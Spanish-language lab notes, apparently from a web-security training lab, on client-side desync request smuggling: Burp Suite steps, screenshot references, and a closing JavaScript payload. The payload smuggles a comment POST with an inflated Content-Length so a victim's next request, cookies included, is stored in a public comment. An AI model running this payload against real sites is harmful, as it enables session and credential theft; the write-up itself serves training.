En esta clase localizamos un gadget útil dentro de la aplicación: el sistema de comentarios en los posts. Utilizamos el vector de desincronización previamente identificado para inyectar una petición parcial dentro del cuerpo de un comentario.

Al recargar el post, comprobamos que la petición ha sido reflejada parcialmente en el contenido visible, lo que demuestra que podemos capturar y almacenar partes de peticiones arbitrarias que luego serán accesibles públicamente.

Solucion
aqui mandamos una tipica consulta pero vemos que no da resultado como seria en una RS (Request Smuggling)
la diferencia en este payload es que si vemos en la parte de arriba podemos ver que le metimos 100 en CL pero abajo no se ve reflejado
![Pasted image 20250812205026.png](imagenes/Pasted image 20250812205026.png)
asi que para que se puede ejecutar una consulta se deberia aplicar en diferentes sockets asi que en esta caso vamos a intecerpar el apartado /en que era el redirect
![Pasted image 20250812205255.png](imagenes/Pasted image 20250812205255.png)
y como sabemos que estamos en un CSD pues normalmente si nosotro le dabamos send en el Attacker Request esperamos un error 400 pero aqui no se refleja
![Pasted image 20250812205517.png](imagenes/Pasted image 20250812205517.png)
asi que nosotros necesitamos hacer una coneccion TCP para que se puede ejecutar el payload para ello vamos a crear un grupo en el BS y lo configuramos a send group
![Pasted image 20250812205721.png](imagenes/Pasted image 20250812205721.png)
Cuando le damos a send aqui si podemos ver el error
![Pasted image 20250812205817.png](imagenes/Pasted image 20250812205817.png)
entonces para complementar el ataque vamos a interceptar un post y vamos a configurarlo en el BS
![Pasted image 20250812210134.png](imagenes/Pasted image 20250812210134.png)
lo configuramos tal que quede asi
![Pasted image 20250812210301.png](imagenes/Pasted image 20250812210301.png)
Entonces todo esto no lo podemos copiar y pasarlo al attacker
![Pasted image 20250812210545.png](imagenes/Pasted image 20250812210545.png)
ahora vamos a configurarlo
1.- (el comment lo pasamos hasta el final)
2.- (configurar la longitud real para no tener problemas)
![Pasted image 20250812210757.png](imagenes/Pasted image 20250812210757.png)
tal que quedaria asi
![Pasted image 20250812211038.png](imagenes/Pasted image 20250812211038.png)
donde lo vemos reflejado si nos vamos a la pagina donde esta el post lo veremos reflejado
![Pasted image 20250812211123.png](imagenes/Pasted image 20250812211123.png)
pero como podemos hacer para que la victima no vea este tipo de post donde muestre la infomacion para eso nos vamos a montar un script en JS donde me automatize esto

payload (
<script>
    smuggledRequest = [
      "POST /en/post/comment HTTP/1.1",
      "Host: 0a2700d203ea680480563a4e0009009d.h1-web-security-academy.net",
      "Cookie: session=10C0ZiNzSfrPlheSkA0EmCPoX1tgGb9H",
      "Content-Type: application/x-www-form-urlencoded",
      "Content-Length: 800",
      "",
"csrf=AYsRFi6GRECmO9Nfp6MdsDsoe4ew7FRQ&postId=6&name=test&email=test@test.com&website=https://callate.com&comment=test"
    ].join("\r\n")

    fetch("http://0a2700d203ea680480563a4e0009009d.h1-web-security-academy.net", {
      method: "POST",
      body: smuggledRequest,
      credentials: 'include',
      mode: "no-cors"
    });
</script>
)